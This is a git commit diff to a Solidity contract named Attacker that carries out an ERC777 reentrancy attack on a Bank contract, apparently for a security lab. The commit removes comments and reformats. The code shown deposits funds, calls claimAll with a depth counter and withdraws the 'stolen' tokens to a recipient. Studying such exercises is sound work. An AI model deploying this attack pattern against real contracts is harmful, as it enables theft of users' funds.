2a46c134d02bdfaccbef5cb9a42e87d988347e86
sarahakim99 <63162252+sarahakim99@users.noreply.github.com>
2025-07-27 13:17:12 +0100

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -8,20 +8,20 @@ import "./Bank.sol";
 
 contract Attacker is AccessControl, IERC777Recipient {
     bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
-    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); //This is the location of the EIP1820 registry
-    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient"); //When someone tries to send an ERC777 contract, they check if the recipient implements this interface
+    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
     uint8 depth = 0;
     uint8 max_depth = 2;
 
     Bank public bank;
 
-    event Deposit(uint256 amount );
+    event Deposit(uint256 amount);
     event Recurse(uint8 depth);
 
     constructor(address admin) {
         _grantRole(DEFAULT_ADMIN_ROLE, admin);
         _grantRole(ATTACKER_ROLE, admin);
-        _erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this)); //In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
+        _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
     }
 
     function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
@@ -30,13 +30,9 @@ contract Attacker is AccessControl, IERC777Recipient {
         _grantRole(ATTACKER_ROLE, address(bank.token()));
     }
 
-    /* 
-       The main attack function that should start the reentrancy attack 
-       amt is the amt of ETH the attacker will deposit initially to start the attack 
-    */
     function attack(uint256 amt) payable public {
-        require( address(bank) != address(0), "Target bank not set" );
-        require( msg.value >= amt, "Insufficient ETH sent" );
+        require(address(bank) != address(0), "Target bank not set");
+        require(msg.value >= amt, "Insufficient ETH sent");
         
         bank.deposit{value: amt}();
         emit Deposit(amt);
@@ -44,18 +40,11 @@ contract Attacker is AccessControl, IERC777Recipient {
         bank.claimAll();
     }
 
-    /* 
-       After the attack, this contract has a lot of (stolen) MCITR tokens 
-       This function sends those tokens to the target recipient 
-    */
     function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
         ERC777 token = bank.token();
-        token.send(recipient,token.balanceOf(address(this)),"");
+        token.send(recipient, token.balanceOf(address(this)), "");
     }
 
-    /* 
-       This is the function that gets called when the Bank contract sends MCITR tokens 
-    */
     function tokensReceived(
         address operator,
         address from,
